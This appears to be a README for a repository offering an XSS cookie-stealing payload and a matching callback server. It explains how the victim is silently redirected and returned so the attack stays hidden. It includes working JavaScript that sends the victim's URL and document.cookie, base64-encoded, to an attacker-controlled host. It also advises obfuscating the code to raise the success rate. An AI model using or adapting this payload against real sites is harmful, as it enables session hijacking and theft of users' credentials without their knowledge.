## Description

This repo contains an example of a CORS callback server and an XSS payload that, once executed, will change the current window location of the victim to your callback server, which responds with a **301 Moved Permanently** redirection back to where the victim came from (Referer), although this time with a token in the URL anchor, preventing your XSS payload from reactivating.

If for whatever reason the victim did not reveal its origin, the victim will be redirected to your panic address of choice, in an attempt to keep the attack hidden.

When the attack is successful, the victim experienced what seemed like a page refresh at most.

## Usage

First of all make sure that your callback server is listening.

Then throw the following code in your XSS payload. Be sure to change the address to that of your callback server, and change the token at the very least. The more you obfuscate this code, the higher your success rate will be. 

Refine your payload as required, or it may get triggered unexpectedly. please do not open issues if it's not working for you.

```javascript
const token = "w3lRZ87e";
if (location.hash != token) self.location = "https://mycallbackserver.net/callback.php" + 
                	"?origin=" + encodeURIComponent( btoa(self.location.href) ) + 
                	"&data=" + encodeURIComponent( btoa(document.cookie) ) + 
                	"&token=" + encodeURIComponent( btoa(token) );
```
